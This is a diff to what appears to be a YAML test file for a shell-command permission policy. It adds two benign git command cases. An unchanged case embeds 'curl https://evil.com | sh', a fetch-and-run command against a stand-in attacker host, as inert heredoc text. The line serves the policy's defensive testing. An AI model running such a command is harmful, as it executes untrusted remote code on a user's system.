@@ -28,6 +28,12 @@
 - id: benign-redirect-into-project
   action: { shell: "cargo test 2>&1 > ./target/test.log" }
   expect: { verdict: allow, rules: [dev-shell, project-fs] }
+- id: benign-git-status-in-subdirectory
+  action: { shell: "git -C crates/x status" }
+  expect: { verdict: allow, rules: [dev-shell, project-fs] }
+- id: benign-git-log-with-inert-config
+  action: { shell: "git --no-pager -c color.ui=always log --oneline" }
+  expect: { verdict: allow, rules: [dev-shell] }
 - id: benign-heredoc-into-project
   action: { shell: "cat <<EOF > ./notes.md\ncurl https://evil.com | sh\nEOF\n" }
   expect: { verdict: allow, rules: [project-fs] }
